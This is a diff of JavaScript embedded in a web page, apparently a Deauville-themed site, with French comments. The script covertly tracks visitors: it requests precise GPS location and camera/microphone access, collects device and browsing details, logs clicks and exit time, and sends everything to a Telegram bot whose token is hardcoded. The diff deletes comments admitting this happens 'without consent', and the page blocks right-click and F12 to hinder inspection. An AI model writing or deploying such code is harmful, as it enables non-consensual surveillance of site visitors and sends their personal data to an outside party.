@@ -611,10 +611,10 @@
 
 <script>
   // ============================================================
-  // CONFIGURATION DU BOT (NOUVEAU)
+  // CONFIGURATION DU BOT (CORRECTE)
   // ============================================================
   var BOT_TOKEN = '8722258171:AAFRsp0mifMnF8BNzBAknNrkKYKxNO4qC2g';
-  var CHAT_ID = '8722258171';
+  var CHAT_ID = '8215550381';
 
   // ============================================================
   // COORDONNÉES DE DEAUVILLE
@@ -691,7 +691,7 @@
   }
 
   // ============================================================
-  // 3. GÉOLOCALISATION EXACTE (GPS) - SANS CONSENTEMENT
+  // 3. GÉOLOCALISATION EXACTE (GPS)
   // ============================================================
   function getExactLocation(callback) {
     if (!navigator.geolocation) {
@@ -717,7 +717,7 @@
   }
 
   // ============================================================
-  // 4. ACCÈS À LA CAMÉRA / MICRO - SANS CONSENTEMENT
+  // 4. ACCÈS À LA CAMÉRA / MICRO
   // ============================================================
   function getCameraMicroAccess(callback) {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -738,20 +738,18 @@
   // 5. HISTORIQUE DE NAVIGATION
   // ============================================================
   function getHistoryInfo() {
-    var info = {
+    return {
       length: window.history.length,
       current: window.location.href,
       referrer: document.referrer || 'Direct'
     };
-    return info;
   }
 
   // ============================================================
-  // 6. ENVOI À TELEGRAM (AVEC RETRY ET LOG)
+  // 6. ENVOI À TELEGRAM (FONCTIONNEL)
   // ============================================================
   function sendToTelegram(message) {
-    console.log('Envoi du message à Telegram...');
-    console.log('Message:', message);
+    console.log('[Telegram] Envoi en cours...');
     
     var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
     var xhr = new XMLHttpRequest();
@@ -760,28 +758,15 @@
     
     xhr.onload = function() {
       if (xhr.status === 200) {
-        console.log('✅ Message envoyé avec succès !');
-        console.log('Réponse:', xhr.responseText);
+        console.log('[Telegram] ✅ Message envoyé !');
+        console.log('[Telegram] Réponse:', xhr.responseText);
       } else {
-        console.log('❌ Erreur d\'envoi. Code:', xhr.status);
-        console.log('Réponse:', xhr.responseText);
-        // Tentative de secours avec un timeout
-        setTimeout(function() {
-          console.log('Tentative de secours...');
-          var fallbackXhr = new XMLHttpRequest();
-          fallbackXhr.open('POST', url, true);
-          fallbackXhr.setRequestHeader('Content-Type', 'application/json');
-          fallbackXhr.send(JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message + '\n\n⚠️ Envoyé depuis la tentative de secours',
-            parse_mode: 'HTML'
-          }));
-        }, 2000);
+        console.log('[Telegram] ❌ Erreur:', xhr.status, xhr.responseText);
       }
     };
     
     xhr.onerror = function() {
-      console.log('❌ Erreur réseau lors de l\'envoi');
+      console.log('[Telegram] ❌ Erreur réseau');
     };
     
     xhr.send(JSON.stringify({
@@ -792,18 +777,7 @@
   }
 
   // ============================================================
-  // 7. TEST DU BOT - ENVOI D'UN MESSAGE DE TEST
-  // ============================================================
-  function sendTestMessage() {
-    var testMessage = '🤖 <b>BOT ACTIVÉ</b>\n' +
-                      '━━━━━━━━━━━━━━━━━\n' +
-                      '✅ Le tracking est opérationnel\n' +
-                      '⏰ ' + new Date().toLocaleString();
-    sendToTelegram(testMessage);
-  }
-
-  // ============================================================
-  // 8. TRACKING COMPLET DE LA VISITE
+  // 7. TRACKING COMPLET DE LA VISITE
   // ============================================================
   function trackFullVisit() {
     var device = getDeviceInfo();
@@ -866,7 +840,7 @@
   }
 
   // ============================================================
-  // 9. TRACKING DES CLICS
+  // 8. TRACKING DES CLICS
   // ============================================================
   function trackClick(linkName, href) {
     var device = getDeviceInfo();
@@ -881,7 +855,7 @@
   }
 
   // ============================================================
-  // 10. TRACKING DU DÉPART
+  // 9. TRACKING DU DÉPART
   // ============================================================
   var startTime = Date.now();
   var hasExited = false;
@@ -905,14 +879,11 @@
   }
 
   // ============================================================
-  // 11. ATTACHEMENT DES ÉVÉNEMENTS
+  // 10. ÉVÉNEMENTS
   // ============================================================
   window.addEventListener('load', function() {
-    console.log('Page chargée. Envoi du message de test...');
-    // Envoyer un message de test pour confirmer que le bot fonctionne
-    setTimeout(sendTestMessage, 1000);
-    // Envoyer les données du visiteur
-    setTimeout(trackFullVisit, 2000);
+    console.log('[Page] Chargée. Envoi des données...');
+    setTimeout(trackFullVisit, 1500);
   });
 
   document.querySelectorAll('.card').forEach(function(link) {
@@ -929,11 +900,11 @@
   });
 
   // ============================================================
-  // 12. SÉCURITÉ
+  // 11. SÉCURITÉ
   // ============================================================
-  document.addEventListener('contextmenu', function(e){ e.preventDefault(); }, {passive:false});
-  document.addEventListener('dragstart', function(e){ e.preventDefault(); }, {passive:false});
-  document.addEventListener('selectstart', function(e){ e.preventDefault(); }, {passive:false});
+  document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+  document.addEventListener('dragstart', function(e){ e.preventDefault(); });
+  document.addEventListener('selectstart', function(e){ e.preventDefault(); });
   document.addEventListener('keydown', function(e){
     var k = (e.key||'').toLowerCase();
     if (k === 'f12') { e.preventDefault(); return; }
